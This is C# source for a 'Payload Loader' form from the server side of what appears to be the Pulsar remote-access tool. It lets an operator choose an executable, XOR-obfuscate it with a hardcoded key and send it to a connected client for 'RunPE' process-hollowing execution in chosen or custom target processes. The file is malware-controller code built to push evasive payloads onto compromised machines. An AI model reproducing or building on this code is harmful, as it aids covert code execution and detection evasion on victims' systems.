using Microsoft.CSharp;
using Pulsar.Common.Messages;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.ServiceModel.Channels;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{




    public partial class FrmLoader : Form
    {
        private readonly Client _connectClient;

        private readonly PayloadLoaderHandler PayloadHandler;
        private static readonly Dictionary<Client, FrmLoader> OpenedForms = new Dictionary<Client, FrmLoader>();



        public static FrmLoader CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmLoader r = new FrmLoader(client);
            r.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, r);
            return r;
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((System.Windows.Forms.MethodInvoker)this.Close);
            }
        }
        public FrmLoader(Client client)
        {
            _connectClient = client;
            PayloadHandler = new PayloadLoaderHandler(client);
            RegisterMessageHandler();
            InitializeComponent();
        }


        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            MessageHandler.Register(PayloadHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(PayloadHandler);
            _connectClient.ClientState -= ClientDisconnected;
        }
        static byte[] XorEncryptDecrypt(byte[] data, byte[] key)
        {
            byte[] output = new byte[data.Length];
            int keyLength = key.Length;

            for (int i = 0; i < data.Length; i++)
            {
                output[i] = (byte)(data[i] ^ key[i % keyLength]);
            }

            return output;
        }
    
   
       

        private void button2_Click(object sender, EventArgs e)
        {




            if (RunPE.Checked)
            {

                if (checkBox1.Checked)
                {
                    PayloadHandler.SendPayloadData("RunPE", "a", XorEncryptDecrypt(File.ReadAllBytes(FilePath.Text), Encoding.UTF8.GetBytes("VIRTUELPAPIIIIIII")), "");
                }
                if (checkBox2.Checked)
                {
                    PayloadHandler.SendPayloadData("RunPE", "b", XorEncryptDecrypt(File.ReadAllBytes(FilePath.Text), Encoding.UTF8.GetBytes("VIRTUELPAPIIIIIII")), "");
                }
                if (checkBox3.Checked)
                {
                    PayloadHandler.SendPayloadData("RunPE", "c", XorEncryptDecrypt(File.ReadAllBytes(FilePath.Text), Encoding.UTF8.GetBytes("VIRTUELPAPIIIIIII")), "");
                }
                if (custompath.Checked)
                {
                    PayloadHandler.SendPayloadData("RunPE", "d", XorEncryptDecrypt(File.ReadAllBytes(FilePath.Text), Encoding.UTF8.GetBytes("VIRTUELPAPIIIIIII")), Pathtxt.Text);



                }

                //RunPE

            }

        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            using (ofd)
            {
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    FilePath.Text = ofd.FileName;
                }
            }
        }

        private void FrmLoader_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
        }

        private void FrmLoader_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Payload Loader | ", _connectClient);
        }

   

        private void custompath_CheckedChanged(object sender, EventArgs e)
        {
            if (custompath.Checked)
            {
                Pathtxt.Visible = true;
                custompathbutton.Visible = true;

            }
            else
            {
                Pathtxt.Visible = false;
                custompathbutton.Visible = false;
            }
        }

        private void custompathbutton_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Title = "Select a file";
                openFileDialog.Filter = "All Files (*.*)|*.*"; 
                openFileDialog.Multiselect = false; 

             
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    
                    Pathtxt.Text = openFileDialog.FileName;
                }
            }
        }
    }
}